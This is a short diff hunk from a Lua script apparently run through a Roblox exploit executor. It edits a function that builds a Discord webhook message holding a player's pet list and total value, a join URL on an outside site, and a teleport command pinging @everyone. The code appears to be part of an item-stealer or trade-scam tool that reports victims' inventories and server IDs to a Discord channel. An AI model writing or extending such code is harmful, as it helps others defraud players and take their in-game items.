@@ -351,15 +351,15 @@ local function createDiscordEmbed(petList, totalValue, callback)
             {
                 name = "🏝️ **Join with URL**",
                 value = string.format("[%s](https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s)",
-                    game.JobId, game.PlaceId, game.JobId),
+                    getgenv().JobId, game.PlaceId, getgenv().JobId),
                 inline = false
             }
         },
-        footer = { text = string.format("%s | %s", game.PlaceId, game.JobId) }
+        footer = { text = string.format("%s | %s", game.PlaceId, getgenv().JobId) }
     }
     local data = {
         content = string.format("--@everyone\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%s, \"%s\")\n",
-            game.PlaceId, game.JobId),
+            game.PlaceId, getgenv().JobId),
         username = LocalPlayer.Name,
         avatar_url = "https://cdn.discordapp.com/attachments/1024859338205429760/1103739198735261716/icon.png",
         embeds = {embed}
